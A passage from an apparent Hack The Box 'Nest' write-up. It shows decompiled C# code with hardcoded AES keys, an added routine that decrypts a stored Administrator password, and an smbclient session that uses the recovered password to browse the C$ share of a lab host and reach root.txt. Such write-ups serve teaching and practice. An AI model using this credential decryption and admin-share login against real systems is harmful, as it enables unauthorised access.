+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+using System.Collections.Generic;
+using System.Collections.ObjectModel;
+using System.Diagnostics;
+
+namespace HqkLdap
+{
+    public class CR
+    {
+        private const string K = "667912";
+
+        private const string I = "1L1SA61493DRV53Z";
+
+        private const string SA = "1313Rf99";
+
+        public CR()
+        {
+        }
+
+        public static string DS(string EncryptedString)
+        {
+            if (string.IsNullOrEmpty(EncryptedString))
+            {
+                return string.Empty;
+            }
+            return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
+        }
+
+        public static string ES(string PlainString)
+        {
+            if (string.IsNullOrEmpty(PlainString))
+            {
+                return string.Empty;
+            }
+            return CR.RE(PlainString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
+        }
+
+        private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
+        {
+            byte[] bytes = Encoding.ASCII.GetBytes(initVector);
+            byte[] numArray = Encoding.ASCII.GetBytes(saltValue);
+            byte[] numArray1 = Convert.FromBase64String(cipherText);
+            Rfc2898DeriveBytes rfc2898DeriveByte = new Rfc2898DeriveBytes(passPhrase, numArray, passwordIterations);
+            byte[] bytes1 = rfc2898DeriveByte.GetBytes(checked((int)Math.Round((double)keySize / 8)));
+            AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider()
+            {
+                Mode = CipherMode.CBC
+            };
+            ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(bytes1, bytes);
+            MemoryStream memoryStream = new MemoryStream(numArray1);
+            CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read);
+            byte[] numArray2 = new byte[checked(checked((int)numArray1.Length) + 1)];
+            int num = cryptoStream.Read(numArray2, 0, checked((int)numArray2.Length));
+            memoryStream.Close();
+            cryptoStream.Close();
+            return Encoding.ASCII.GetString(numArray2, 0, num);
+        }
+
+        private static string RE(string plainText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
+        {
+            string base64String;
+            byte[] bytes = Encoding.ASCII.GetBytes(initVector);
+            byte[] numArray = Encoding.ASCII.GetBytes(saltValue);
+            byte[] bytes1 = Encoding.ASCII.GetBytes(plainText);
+            Rfc2898DeriveBytes rfc2898DeriveByte = new Rfc2898DeriveBytes(passPhrase, numArray, passwordIterations);
+            byte[] numArray1 = rfc2898DeriveByte.GetBytes(checked((int)Math.Round((double)keySize / 8)));
+            AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider()
+            {
+                Mode = CipherMode.CBC
+            };
+            ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor(numArray1, bytes);
+            using (MemoryStream memoryStream = new MemoryStream())
+            {
+                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
+                {
+                    cryptoStream.Write(bytes1, 0, checked((int)bytes1.Length));
+                    cryptoStream.FlushFinalBlock();
+                    byte[] array = memoryStream.ToArray();
+                    memoryStream.Close();
+                    cryptoStream.Close();
+                    base64String = Convert.ToBase64String(array);
+                }
+            }
+            return base64String;
+        }
+##############################ADDED CODE###################################        
+        public static void Main(){
+            Console.WriteLine(CR.DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="));
+        }
+###########################################################################
+    }
+}
+```
+
+The way I went about this was to run it inside an online .Net complier.
+
+![](https://cdn-images-1.medium.com/max/1024/0*_o9sm6kINQaAZ4OB)
+
+We can see from above that once we run the code, it gives us the decrypted password which is: XtH4nkS4Pl4y1nGX. Now that we have the Administrative password, we can now log into the smb drive **C** as an Administrative user and grab the root.txt flag.
+
+```
+root@kali:~/htb/nest# smbclient -U Administrator%XtH4nkS4Pl4y1nGX \\\\10.10.10.178\\C$
+Domain=[HTB-NEST] OS=[] Server=[]
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $Recycle.Bin DHS 0 Mon Jul 13 22:34:39 2009
+  Boot DHS 0 Sat Jan 25 16:15:35 2020
+  bootmgr AHSR 383786 Fri Nov 19 23:40:08 2010
+  BOOTSECT.BAK AHSR 8192 Tue Aug 6 01:16:26 2019
+  Config.Msi DHS 0 Sat Jan 25 16:49:12 2020
+  Documents and Settings DHS 0 Tue Jul 14 01:06:44 2009
+  pagefile.sys AHS 2146881536 Tue Jun 9 16:59:51 2020
+  PerfLogs D 0 Mon Jul 13 23:20:08 2009
+  Program Files DR 0 Wed Aug 7 19:40:50 2019
+  Program Files (x86) DR 0 Tue Jul 14 01:06:53 2009
+  ProgramData DH 0 Mon Aug 5 16:24:41 2019
+  Recovery DHS 0 Mon Aug 5 16:22:25 2019
+  restartsvc.bat A 33 Wed Aug 7 19:43:09 2019
+  Shares D 0 Tue Aug 6 09:59:55 2019
+  System Volume Information DHS 0 Tue Aug 6 00:17:38 2019
+  Users DR 0 Thu Aug 8 13:19:40 2019
+  Windows D 0 Sat Jan 25 16:22:42 2020
+
+        10485247 blocks of size 4096. 6543143 blocks available
+smb: \> cd ./Users
+smb: \Users\> ls
+  . DR 0 Thu Aug 8 13:19:40 2019
+  .. DR 0 Thu Aug 8 13:19:40 2019
+  Administrator D 0 Mon Aug 5 16:33:56 2019
+  All Users DHS 0 Tue Jul 14 01:06:44 2009
+  Default DHR 0 Tue Jul 14 02:38:21 2009
+  Default User DHS 0 Tue Jul 14 01:06:44 2009
+  desktop.ini AHS 174 Tue Jul 14 00:57:55 2009
+  Public DR 0 Tue Jul 14 00:57:55 2009
+  Service\_HQK D 0 Thu Aug 8 13:19:41 2019
+  TempUser D 0 Fri Aug 9 08:33:50 2019
+
+        10485247 blocks of size 4096. 6543143 blocks available
+smb: \Users\> cd ./Administrator\
+smb: \Users\Administrator\> ls
+  . D 0 Mon Aug 5 16:33:56 2019
+  .. D 0 Mon Aug 5 16:33:56 2019
+  AppData DH 0 Mon Aug 5 16:27:25 2019
+  Application Data DHS 0 Mon Aug 5 16:27:25 2019
+  Contacts DR 0 Sat Jan 25 17:02:44 2020
+  Cookies DHS 0 Mon Aug 5 16:27:25 2019
+  Desktop DR 0 Sun Jan 26 02:20:50 2020
+  Documents DR 0 Sat Jan 25 17:02:44 2020
+  Downloads DR 0 Sat Jan 25 17:02:44 2020
+  Favorites DR 0 Sat Jan 25 17:02:44 2020
+  Links DR 0 Sat Jan 25 17:02:44 2020
+  Local Settings DHS 0 Mon Aug 5 16:27:25 2019
+  Music DR 0 Sat Jan 25 17:02:44 2020
+  My Documents DHS 0 Mon Aug 5 16:27:25 2019
+  NetHood DHS 0 Mon Aug 5 16:27:25 2019
+  NTUSER.DAT AHS 786432 Sun Jan 26 02:31:38 2020
+  ntuser.dat.LOG1 AHS 262144 Tue Jun 9 17:24:53 2020
+  ntuser.dat.LOG2 AHS 0 Mon Aug 5 16:27:25 2019
+  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf AHS 65536 Mon Aug 5 16:27:27 2019
+  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms AHS 524288 Mon Aug 5 16:27:27 2019
+  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms AHS 524288 Mon Aug 5 16:27:27 2019
+  ntuser.ini HS 20 Mon Aug 5 16:27:25 2019
+  Pictures DR 0 Sat Jan 25 17:02:44 2020
+  PrintHood DHS 0 Mon Aug 5 16:27:25 2019
+  Recent DHS 0 Mon Aug 5 16:27:25 2019
+  Saved Games DR 0 Sat Jan 25 17:02:44 2020
+  Searches DR 0 Sat Jan 25 17:02:44 2020
+  SendTo DHS 0 Mon Aug 5 16:27:25 2019
+  Start Menu DHS 0 Mon Aug 5 16:27:25 2019
+  Templates DHS 0 Mon Aug 5 16:27:25 2019
+  Videos DR 0 Sat Jan 25 17:02:44 2020
+
+        10485247 blocks of size 4096. 6543143 blocks available
+smb: \Users\Administrator\> cd ./Desktop
+smb: \Users\Administrator\Desktop\> ls
+  . DR 0 Sun Jan 26 02:20:50 2020
+  .. DR 0 Sun Jan 26 02:20:50 2020
+  desktop.ini AHS 282 Sat Jan 25 17:02:44 2020
+  root.txt A 32 Mon Aug 5 18:27:26 2019
+
+        10485247 blocks of size 4096. 6543143 blocks available
+```
+
+And we’re done with this box! This was a fun box, definitely different than what you would see on an easy box.
+
+Hope this article was useful in any way! Thoughts and remarks are welcome!
+
+_Originally published at_ [_https://epliu\_2555.hashnode.dev_](https://epliu_2555.hashnode.dev/hack-the-box-nest-ckbgskmos004kyhs1bj3kihpt)_._
